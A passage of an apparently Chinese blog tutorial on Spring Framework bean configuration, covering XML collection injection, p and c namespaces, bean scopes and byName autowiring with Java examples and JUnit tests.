class=<span class="string">&quot;com.stoocea.Pojo.Hello&quot;</span>&gt;</span><br><span class="line">            &lt;constructor-arg type=<span class="string">&quot;java.lang.String&quot;</span> value=<span class="string">&quot;stoocea&quot;</span>/&gt;</span><br><span class="line">        &lt;/bean&gt;</span><br><span class="line">        &lt;bean id=<span class="string">&quot;UserT&quot;</span> class=<span class="string">&quot;com.stoocea.Pojo.UserT&quot;</span>&gt;&lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">    &lt;bean id=<span class="string">&quot;Address&quot;</span> class=<span class="string">&quot;com.stoocea.Pojo.Address&quot;</span>/&gt;</span><br><span class="line">    &lt;bean id=<span class="string">&quot;student&quot;</span> class=<span class="string">&quot;com.stoocea.Pojo.Student&quot;</span>&gt;</span><br><span class="line">            &lt;property name=<span class="string">&quot;name&quot;</span> value=<span class="string">&quot;stoocea&quot;</span>/&gt;</span><br><span class="line">        &lt;property name=<span class="string">&quot;address&quot;</span> ref=<span class="string">&quot;Address&quot;</span>/&gt;</span><br><span class="line"></span><br><span class="line">        &lt;property name=<span class="string">&quot;books&quot;</span>&gt;</span><br><span class="line">                &lt;array&gt;</span><br><span class="line">                    &lt;value&gt;stoocea1&lt;/value&gt;</span><br><span class="line">                    &lt;value&gt;stoocea2&lt;/value&gt;</span><br><span class="line">                    &lt;value&gt;stoocea3&lt;/value&gt;</span><br><span class="line">                &lt;/array&gt;</span><br><span class="line">            &lt;/property&gt; </span><br><span class="line"></span><br><span class="line">        &lt;property name=<span class="string">&quot;hobbys&quot;</span>&gt;</span><br><span class="line">            &lt;list&gt;</span><br><span class="line">                &lt;value&gt;no&lt;/value&gt;</span><br><span class="line">                &lt;value&gt;elsworld&lt;/value&gt;</span><br><span class="line">                &lt;value&gt;music&lt;/value&gt;</span><br><span class="line">            &lt;/list&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line"></span><br><span class="line">        &lt;property name=<span class="string">&quot;card&quot;</span>&gt;</span><br><span class="line">            &lt;map&gt;</span><br><span class="line">                &lt;entry key=<span class="string">&quot;èº«ä»½è¯&quot;</span> value=<span class="string">&quot;1321323131212312&quot;</span>/&gt;</span><br><span class="line">                &lt;entry key=<span class="string">&quot;QQ&quot;</span> value=<span class="string">&quot;1323312323123123&quot;</span>/&gt;</span><br><span class="line">            &lt;/map&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line"></span><br><span class="line">        &lt;property name=<span class="string">&quot;games&quot;</span>&gt;</span><br><span class="line">            &lt;set&gt;</span><br><span class="line">                &lt;value&gt;LOL&lt;/value&gt;</span><br><span class="line">                &lt;value&gt;Elsworld&lt;/value&gt;</span><br><span class="line">            &lt;/set&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;property name=<span class="string">&quot;wife&quot;</span>&gt;</span><br><span class="line">            &lt;<span class="literal">null</span>/&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line"></span><br><span class="line">        &lt;property name=<span class="string">&quot;info&quot;</span>&gt;</span><br><span class="line">            &lt;props&gt;</span><br><span class="line">                &lt;prop key=<span class="string">&quot;å­¦å·&quot;</span>&gt;<span class="number">123132312</span>&lt;/prop&gt;</span><br><span class="line">            &lt;/props&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">&lt;/beans&gt;</span><br><span class="line">&lt;</span><br></pre></td></tr></table></figure><p>ç„¶åå†™ä¸ªæµ‹è¯•ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.stoocea.Pojo.Hello;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"><span class="keyword">import</span> com.stoocea.Pojo.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Mytest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testHello</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;beans.xml&quot;</span>);</span><br><span class="line">        Student student= (Student) context.getBean(<span class="string">&quot;student&quot;</span>);</span><br><span class="line">        System.out.println(student);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013172221521.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013172221521.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h4 id="1x01-p-å‘½åç©ºé—´å’Œ-c-å‘½åç©ºé—´æ³¨å…¥"><a href="#1x01-p-å‘½åç©ºé—´å’Œ-c-å‘½åç©ºé—´æ³¨å…¥" class="headerlink" title="1x01 p å‘½åç©ºé—´å’Œ c å‘½åç©ºé—´æ³¨å…¥"></a>1x01 p å‘½åç©ºé—´å’Œ c å‘½åç©ºé—´æ³¨å…¥</h4><p>ä½¿ç”¨ä¹‹å‰å¿…é¡»å¯¼å…¥ xml çº¦æŸ</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xmlns:p=&quot;http://www.springframework.org/schema/p&quot;</span><br><span class="line">xmlns:c=&quot;http://www.springframework.org/schema/c&quot;</span><br></pre></td></tr></table></figure><p>ä¸¤è€…è¿˜æ˜¯åœ¨ bean æ ‡ç­¾ä¸­å®ç°çš„ï¼Œåªä¸è¿‡ä½¿ç”¨ä¹‹å‰å¿…é¡»è¦æœ‰å…¶å¯¹åº”çš„é…ç½®å¯¼å…¥</p><p>å…ˆçœ‹æˆ‘ä»¬çš„ç›®æ ‡é…ç½®ç±»ï¼ŒUserN å…·æœ‰ name å­—ç¬¦ä¸²å’Œ hobbys é›†åˆï¼Œé›†åˆé‡Œé¢çš„æ¯ä¸ªå±æ€§å€¼çš„ç±»å‹æ˜¯ UserT è¿™ä¸ªç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.stoocea.Pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserN</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> List&lt;UserT&gt; hobbys;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List&lt;UserT&gt; <span class="title function_">getHobbys</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> hobbys;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHobbys</span><span class="params">(List&lt;UserT&gt; hobbys)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.hobbys = hobbys;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;UserN&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, hobbys=&quot;</span> + hobbys.toString() +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åå†çœ‹ bean æ–‡ä»¶æ˜¯å¦‚ä½•è£…é…å®ƒçš„</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xmlns:p</span>=<span class="string">&quot;http://www.springframework.org/schema/p&quot;</span>    &lt;!<span class="attr">--på‘½åç©ºé—´ä½¿ç”¨çš„å‰æå¯¼å…¥--</span>&gt;</span></span><br><span class="line">  xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans</span><br><span class="line">  https://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;</span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">beans</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;UserN&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.stoocea.Pojo.UserN&quot;</span> <span class="attr">p:name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">p:hobbys-ref</span>=<span class="string">&quot;UserT&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>p å‘½åç©ºé—´çš„æ„æ€å°±æ˜¯ properties å±æ€§çš„ç®€å†™ï¼Œå¦‚æœæ˜¯ç®€å•çš„å­—ç¬¦ä¸²ï¼Œæˆ–è€…å…¶ä»–åŸºç¡€ç±»å‹ï¼Œå¯ä»¥ç›´æ¥ç”¨ p å‘½åç©ºé—´è§£å†³ï¼Œå¦‚æœæ¶‰åŠå…¶ä»–çš„å¤æ‚çš„ DIï¼Œè¿˜æ˜¯é€šè¿‡ä¸Šé¢çš„æ–¹æ³•æ¥ï¼Œå½“ç„¶ä¸¤è€…çš„æœ¬è´¨è¿˜æ˜¯é€šè¿‡ set æ–¹å¼çš„æ³¨å…¥</p><p>å†æ¥çœ‹ c å‘½åç©ºé—´ï¼Œç›®æ ‡ç±»æ˜¯ä¸Šé¢çš„ UserT</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:p</span>=<span class="string">&quot;http://www.springframework.org/schema/p&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:c</span>=<span class="string">&quot;http://www.springframework.org/schema/c&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">        https://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">beans</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;UserT&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.stoocea.Pojo.UserT&quot;</span> <span class="attr">c:flag</span>=<span class="string">&quot;stoceaT&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>c çš„æ„æ€å°±æ˜¯ constuctor çš„ç®€å†™ï¼Œä¹Ÿå°±æ˜¯æœ‰å‚æ„é€ çš„ç®€åŒ–æ“ä½œï¼Œä¾ç„¶æ˜¯å¦‚æœç±»å‹å¾ˆç®€å•ï¼Œc æ ‡ç­¾çš„æœ‰å‚æ„é€ å®Œå…¨è¶³å¤Ÿï¼Œå¤æ‚è¿˜æ˜¯è€è€å®å® DI</p><p>ç„¶å c å‘½åç©ºé—´çš„æ³¨å…¥ä¹Ÿæ˜¯æœ‰ä¸¤ç§çš„ï¼Œé€šè¿‡ä¸‹æ ‡ï¼Œæˆ–è€…ç›´æ¥åç§°å®šä½</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013172230113.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013172230113.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="0x02-bean-ä½œç”¨åŸŸ"><a href="#0x02-bean-ä½œç”¨åŸŸ" class="headerlink" title="0x02 bean ä½œç”¨åŸŸ"></a>0x02 bean ä½œç”¨åŸŸ</h3><p>å®˜æ–¹æ–‡æ¡£è¯´æ³•ï¼Œæˆ‘ä»¬åœ¨é…ç½® bean çš„æ—¶å€™ï¼ŒåŒæ—¶èƒ½å¤Ÿè®¾ç½®çš„å®ƒçš„ä½œç”¨åŸŸ</p><p>åœ¨ Spring æ¡†æ¶ä¸‹æ€»è®¡èƒ½å¤Ÿè®¾ç½® 6 ä¸ªä½œç”¨åŸŸï¼Œåé¢å››ä¸ªéƒ½æ˜¯åªæœ‰åœ¨ web åº”ç”¨ä¸­ä½¿ç”¨</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013172240035.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013172240035.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h4 id="1x01-singleton-å•ä¾‹æ¨¡å¼"><a href="#1x01-singleton-å•ä¾‹æ¨¡å¼" class="headerlink" title="1x01 singleton å•ä¾‹æ¨¡å¼"></a>1x01 singleton å•ä¾‹æ¨¡å¼</h4><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œbean çš„ä½œç”¨åŸŸæ˜¯ singleton å•ä¾‹æ¨¡å¼ï¼Œä¹Ÿå°±æ˜¯ä¸è®ºä»<code>ApplicationContext</code>å–å‡ºå¤šå°‘ä¸ªå¯¹è±¡ï¼Œåªè¦æ˜¯åŒåå¯¹è±¡ï¼Œéƒ½åªä¼šç”Ÿæˆä¸€ä¸ªå¯¹è±¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.stoocea.Pojo.Hello;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"><span class="keyword">import</span> com.stoocea.Pojo.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Mytest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testHello</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;beans.xml&quot;</span>);</span><br><span class="line">        UserT userT=  context.getBean(<span class="string">&quot;UserT&quot;</span>,UserT.class);</span><br><span class="line">        UserT userT2=context.getBean(<span class="string">&quot;UserT&quot;</span>, UserT.class);</span><br><span class="line">        System.out.println(userT2==userT);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013172304344.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013172304344.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç»“æœæ˜¯ trueï¼Œè¯´æ˜æˆ‘ä»¬å–åˆ°çš„æ˜¯åŒä¸€ä¸ªå¯¹è±¡</p><p>è€Œå•ä¾‹æ¨¡å¼å…¶å®å°±æ˜¯å…¨å±€å…±äº«ä½œç”¨åŸŸï¼Œè€Œä¸”å•ä¾‹æ¨¡å¼æ˜¯ bean çš„é»˜è®¤æ¨¡å¼ï¼Œæˆ‘ä»¬å¯ä»¥æ˜¾ç¤ºå‡ºæ¥</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;beans xmlns=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="line">       xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">       xmlns:p=<span class="string">&quot;http://www.springframework.org/schema/p&quot;</span></span><br><span class="line">       xmlns:c=<span class="string">&quot;http://www.springframework.org/schema/c&quot;</span></span><br><span class="line">       xsi:schemaLocation=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="line"><span class="string">        https://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;bean id=<span class="string">&quot;UserT&quot;</span> class=<span class="string">&quot;com.stoocea.Pojo.UserT&quot;</span> c:flag=<span class="string">&quot;stoceaT&quot;</span> scope=<span class="string">&quot;singleton&quot;</span>/&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure><h4 id="1x02-prototype-åŸå‹æ¨¡å¼"><a href="#1x02-prototype-åŸå‹æ¨¡å¼" class="headerlink" title="1x02 prototype åŸå‹æ¨¡å¼"></a>1x02 prototype åŸå‹æ¨¡å¼</h4><p>åŸå‹æ¨¡å¼å°±æ˜¯è·Ÿ singleton æ¨¡å¼ç›¸åçš„ä¸€ä¸ªæ¨¡å¼ï¼Œæˆ‘ä»¬ä» context ä¸­å–å‡ºçš„æ‰€æœ‰å¯¹è±¡éƒ½æ˜¯ç‹¬ç«‹çš„ä¸ªä½“</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:p</span>=<span class="string">&quot;http://www.springframework.org/schema/p&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:c</span>=<span class="string">&quot;http://www.springframework.org/schema/c&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">        https://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;UserT&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.stoocea.Pojo.UserT&quot;</span> <span class="attr">c:flag</span>=<span class="string">&quot;stoceaT&quot;</span> <span class="attr">scope</span>=<span class="string">&quot;prototype&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013172259399.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013172259399.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="5-è‡ªåŠ¨è£…é…-bean"><a href="#5-è‡ªåŠ¨è£…é…-bean" class="headerlink" title="5 è‡ªåŠ¨è£…é… bean"></a>5 è‡ªåŠ¨è£…é… bean</h2><h3 id="0x01-ç®€å•å®ç°ä»¥åŠç¯å¢ƒæ­å»º"><a href="#0x01-ç®€å•å®ç°ä»¥åŠç¯å¢ƒæ­å»º" class="headerlink" title="0x01 ç®€å•å®ç°ä»¥åŠç¯å¢ƒæ­å»º"></a>0x01 ç®€å•å®ç°ä»¥åŠç¯å¢ƒæ­å»º</h3><p>Spring å»è£…é… bean æœ‰ä¸‰ç§æ–¹å¼ï¼Œç¬¬ä¸€ç§é€šè¿‡ xml æ–‡ä»¶å»è£…é…æˆ‘ä»¬å·²ç»å­¦ä¹ äº†ï¼Œç¬¬äºŒç§æ˜¯é€šè¿‡ java ä»£ç å»å®ç°ï¼Œç¬¬ä¸‰ç§å°±æ˜¯ Spring è‡ªåŠ¨è£…é… bean</p><p>å…·ä½“å®ç°å¦‚ä¸‹</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;cat&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.stoocea.Pojo.Cat&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dog&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.stoocea.Pojo.Dog&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;person&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.stoocea.Pojo.Person&quot;</span> <span class="attr">autowire</span>=<span class="string">&quot;byName&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;stoocea&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.stoocea.Pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Cat cat;</span><br><span class="line">    <span class="keyword">private</span> Dog dog;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ä¸‹é¢æ˜¯setå’Œgetä»¥åŠtoString</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å•å•ä»¥ Dog ä¸ºä¾‹ï¼Œcat ç±»çš„å®ç°æ˜¯ä¸€æ ·çš„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.stoocea.Pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dog</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">shout</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;wang&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testPerson</span><span class="params">()</span>&#123;</span><br><span class="line">    ApplicationContext context=<span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;beans.xml&quot;</span>);</span><br><span class="line">    Person person=context.getBean(<span class="string">&quot;person&quot;</span>, Person.class);</span><br><span class="line">    person.getDog().shout();</span><br><span class="line">    person.getCat().shout();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013172318178.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013172318178.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å…¶å®è‡ªåŠ¨è£…é…è¿˜æœ‰å¾ˆå¤šçš„æ–¹å¼åŒºå®ç°ï¼Œåªä¸è¿‡æœ€ç²¾ç¡®æœ€é€‚ç”¨çš„æ˜¯ byNameï¼Œå› ä¸ºä»–ä¼šå» Spring å®¹å™¨å»æ‰¾åŒåçš„ beanï¼Œä½†å¦‚æœå±æ€§å€¼æ˜¯å¯¹è±¡ç±»å‹çš„è¯ï¼ŒbyType è¿˜æ˜¯èƒ½æ‰¾åˆ°çš„</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013172416326.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013172416326.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="0x02-æ³¨è§£å®ç°è‡ªåŠ¨è£…é…"><a href="#0x02-æ³¨è§£å®ç°è‡ªåŠ¨è£…é…" class="headerlink" title="0x02 æ³¨è§£å®ç°è‡ªåŠ¨è£…é…"></a>0x02 æ³¨è§£å®ç°è‡ªåŠ¨è£…é…</h3><p>é¦–å…ˆçœ‹ä¸€æ®µæ–‡ä»¶</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013172336677.png" class="lazyload placeholder" 